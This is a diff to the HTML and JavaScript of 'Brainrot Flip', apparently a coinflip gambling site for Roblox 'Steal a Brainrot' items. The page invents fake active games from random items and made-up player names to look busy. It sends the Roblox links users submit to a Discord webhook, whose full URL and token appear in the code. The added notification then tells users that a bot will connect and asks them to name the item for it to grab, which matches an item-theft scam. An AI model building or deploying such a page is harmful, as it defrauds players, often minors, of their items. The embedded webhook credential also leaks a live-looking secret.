@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brainrot Flip - The First MM2 Coinflipping Site</title>
+    <title>Brainrot Flip - The First Steal a Brainrot Coinflipping Site</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -150,11 +150,40 @@
             color: green;
             margin: 10px 0;
         }
+        .notification {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 5px;
+            z-index: 3;
+            max-width: 80%;
+            text-align: center;
+        }
+        .notification button {
+            background-color: #333;
+            padding: 8px 16px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .notification button:hover {
+            background-color: #555;
+        }
     </style>
 </head>
 <body>
-    <h1>Brainrot Flip - The First MM2 Coinflipping Site</h1>
-    <p>Welcome to Brainrot Flip! Gamble your MM2 items in coinflips and win big!</p>
+    <h1>Brainrot Flip - The First Steal a Brainrot Coinflipping Site</h1>
+    <p>Welcome to Brainrot Flip! Gamble your Brainrots in coinflips and win big!</p>
+
+    <div class="notification" id="depositNotification">
+        A bot will soon connect to the server. Tell the bot what Brainrot to grab in the Roblox chat. Example: (Tralalero Tralala-candy) or (Tralalero Tralala-100k).
+        <br>
+        <button onclick="hideNotification()">OK!</button>
+    </div>
 
     <div class="auth-status" id="authStatus">
         <button id="registerBtn" onclick="openRegister()">Register</button>
@@ -218,31 +247,11 @@
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421757752610521138/G3Dw7CiydmXlRfmBUgb1By2s-Vt4Pw0CKoLFY3h6uFkkp_pg6qMnFEFPJdIFgH-nwS1l';
         const STORAGE_KEY = 'brainrotUser';
+        const GAMES_STORAGE_KEY = 'activeCoinflips';
 
         const secretBrainrots = [
-            {"name": "Las Sis", "mps": "17.5M"},
-            {"name": "La Vacca Saturno Saturnita", "mps": "250k"},
-            {"name": "Blackhole Goat", "mps": "400k"},
-            {"name": "Bisonte Giuppitere", "mps": "300k"},
-            {"name": "Chachechi", "mps": "400k"},
-            {"name": "Trenostruzzo Turbo 4000", "mps": "310k"},
-            {"name": "Los Matteos", "mps": "300k"},
-            {"name": "Chimpanzini_spiderini", "mps": "325k"},
-            {"name": "Karkerkar Kurkur", "mps": "300k"},
-            {"name": "Sammyni Spyderini", "mps": "350k"},
-            {"name": "Guerriro Digitale", "mps": "550k"},
-            {"name": "Extinct Tralalero", "mps": "450k"},
-            {"name": "Fragola La La La", "mps": "450k"},
-            {"name": "Extinct Matteo", "mps": "625k"},
-            {"name": "Dul Dul Dul", "mps": "375k"},
-            {"name": "Los Tralaleirtos", "mps": "500k"},
-            {"name": "Las Tralaleritas", "mps": "650k"},
-            {"name": "La Karkerkar Combinasion", "mps": "750k"},
-            {"name": "Job Job Job Sahur", "mps": "700k"},
             {"name": "Graipuss Medussi", "mps": "1M"},
-            {"name": "Los Spyderinis", "mps": "450k"},
             {"name": "Nooo My Hotspot", "mps": "1.5M"},
-            {"name": "Tortuginni Dragonfruitini", "mps": "350k"},
             {"name": "La Sahur Combinasion", "mps": "2M"},
             {"name": "Quesadilla Crocodila", "mps": "3M"},
             {"name": "La Grande Combinasion", "mps": "10M"},
@@ -250,10 +259,8 @@
             {"name": "La Extinct Grande", "mps": "23.5M"},
             {"name": "Garama and Madundung", "mps": "50M"},
             {"name": "Pot Hotspot", "mps": "2.5M"},
-            {"name": "Las Vaquitas Saturnitas", "mps": "750k"},
             {"name": "Chicleteira Bicicleteira", "mps": "3.5M"},
             {"name": "Spaghetti Tualetti", "mps": "60M"},
-            {"name": "Agarrini la Palini", "mps": "425k"},
             {"name": "Los Noo My Hotspotsitos", "mps": "5M"},
             {"name": "67", "mps": "7.5M"},
             {"name": "Los Chicleteiras", "mps": "7M"},
@@ -272,54 +279,122 @@
 
         const players = ['StopGamblingNow', 'ExclusiveRelax', 'imtheking_lol6', 'cornelis735', 'Godzilla63616'];
 
-        function generateGame() {
-            const brainrot1 = secretBrainrots[Math.floor(Math.random() * secretBrainrots.length)];
-            const brainrot2 = secretBrainrots[Math.floor(Math.random() * secretBrainrots.length)];
-            const player = players[Math.floor(Math.random() * players.length)];
-            const mps1 = brainrot1.mps;
-            const mps2 = brainrot2.mps;
-
-            return `
-                <div class="game">
-                    <div>
-                        <div>Brainrot: ${brainrot1.name}</div>
-                        <div>Player: ${player}</div>
-                        <div>Brainrot: ${brainrot2.name}</div>
-                        <div>Value: ${mps1}</div>
-                    </div>
-                    <button onclick="openInventory()">Join Match</button>
-                </div>
-            `;
+        function parseMpsValue(mps) {
+            const value = parseFloat(mps.replace(/[Mk]/g, ''));
+            return mps.includes('M') ? value * 1e6 : value * 1e3;
         }
 
-        function addGame() {
-            const gamesContainer = document.getElementById('gamesContainer');
-            gamesContainer.insertAdjacentHTML('beforeend', generateGame());
-
-            // Remove 1, 2, or 3 games based on probability
-            const games = gamesContainer.getElementsByClassName('game');
-            const rand = Math.random();
-            let numToRemove = 0;
-            if (rand < 0.4) {
-                numToRemove = 1;
-            } else if (rand < 0.8) {
-                numToRemove = 2;
+        function formatNumber(num) {
+            if (num >= 1e6) {
+                return (num / 1e6).toFixed(1).replace(/\.0$/, '') + 'M';
+            } else if (num >= 1e3) {
+                return Math.floor(num / 1e3) + 'k';
             } else {
-                numToRemove = 3;
-            }
-
-            for (let i = 0; i < numToRemove && games.length > 0; i++) {
-                games[0].remove();
+                return num.toString();
             }
         }
 
-        // Initialize with 5 games
-        for (let i = 0; i < 5; i++) {
-            addGame();
+        function formatValueRange(mps) {
+            const numericValue = parseMpsValue(mps);
+            const minValue = numericValue * 0.9;
+            const maxValue = numericValue * 1.1;
+
+            const minStr = formatNumber(minValue);
+            const maxStr = formatNumber(maxValue);
+            return `(${minStr} - ${maxStr})`;
         }
 
-        // Add new game every 10 seconds
-        setInterval(addGame, 10000);
+        function generateGame() {
+            const brainrot = secretBrainrots[Math.floor(Math.random() * secretBrainrots.length)];
+            const player = players[Math.floor(Math.random() * players.length)];
+            const mps = brainrot.mps;
+
+            return {
+                html: `
+                    <div class="game">
+                        <div>
+                            <div>Brainrot: ${brainrot.name}</div>
+                            <div>Player: ${player}</div>
+                            <div>Value: ${mps} ${formatValueRange(mps)}</div>
+                        </div>
+                        <button onclick="openInventory()">Join Match</button>
+                    </div>
+                `,
+                id: Date.now() + Math.random() // Unique ID for persistence
+            };
+        }
+
+        function initializeGames() {
+            const gamesContainer = document.getElementById('gamesContainer');
+            let savedGames = JSON.parse(localStorage.getItem(GAMES_STORAGE_KEY)) || [];
+            const initialCount = Math.floor(Math.random() * 2) + 2; // 2 or 3 games
+
+            // If no saved games or page reloaded, generate new ones
+            if (!savedGames.length) {
+                savedGames = [];
+                for (let i = 0; i < initialCount; i++) {
+                    savedGames.push(generateGame());
+                }
+                localStorage.setItem(GAMES_STORAGE_KEY, JSON.stringify(savedGames));
+            }
+
+            // Render saved games
+            gamesContainer.innerHTML = '<h2>Active Coinflips</h2>';
+            savedGames.forEach(game => {
+                gamesContainer.insertAdjacentHTML('beforeend', game.html);
+            });
+        }
+
+        function updateGames() {
+            const gamesContainer = document.getElementById('gamesContainer');
+            let savedGames = JSON.parse(localStorage.getItem(GAMES_STORAGE_KEY)) || [];
+
+            // Determine number of games to remove (40% for 1, 40% for 2, 20% for 3)
+            let rand = Math.random();
+            let numToRemove = rand < 0.4 ? 1 : rand < 0.8 ? 2 : 3;
+            numToRemove = Math.min(numToRemove, savedGames.length); // Don't remove more than available
+            savedGames.splice(0, numToRemove); // Remove from start
+
+            // Determine number of new games to add (40% for 1, 40% for 2, 20% for 3)
+            rand = Math.random();
+            const numToAdd = rand < 0.4 ? 1 : rand < 0.8 ? 2 : 3;
+            for (let i = 0; i < numToAdd; i++) {
+                savedGames.push(generateGame());
+            }
+
+            // Update storage
+            localStorage.setItem(GAMES_STORAGE_KEY, JSON.stringify(savedGames));
+
+            // Render updated games
+            gamesContainer.innerHTML = '<h2>Active Coinflips</h2>';
+            savedGames.forEach(game => {
+                gamesContainer.insertAdjacentHTML('beforeend', game.html);
+            });
+        }
+
+        // Initialize games on load
+        initializeGames();
+
+        // Schedule updates with random time
+        function scheduleUpdate() {
+            const time = Math.random() < 0.5 ? 15000 : 25000;
+            setTimeout(() => {
+                updateGames();
+                scheduleUpdate();
+            }, time);
+        }
+
+        scheduleUpdate();
+
+        function showNotification() {
+            const notification = document.getElementById('depositNotification');
+            notification.style.display = 'block';
+        }
+
+        function hideNotification() {
+            const notification = document.getElementById('depositNotification');
+            notification.style.display = 'none';
+        }
 
         function updateAuthUI() {
             const user = localStorage.getItem(STORAGE_KEY);
@@ -468,7 +543,7 @@
             const link = document.getElementById('linkInput').value.trim();
             const errorEl = document.getElementById('depositError');
             if (!link.startsWith('https://roblox.com') && !link.startsWith('https://www.roblox.com')) {
-                errorEl.textContent = 'Invalid link! It must start with https://roblox.com or https://www.roblox.com';
+                errorEl.textContent = 'Invalid link!';
                 return;
             }
 
@@ -483,7 +558,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    alert('Link sent successfully!');
+                    showNotification();
                     closeModal();
                 } else {
                     errorEl.textContent = 'Error sending link.';
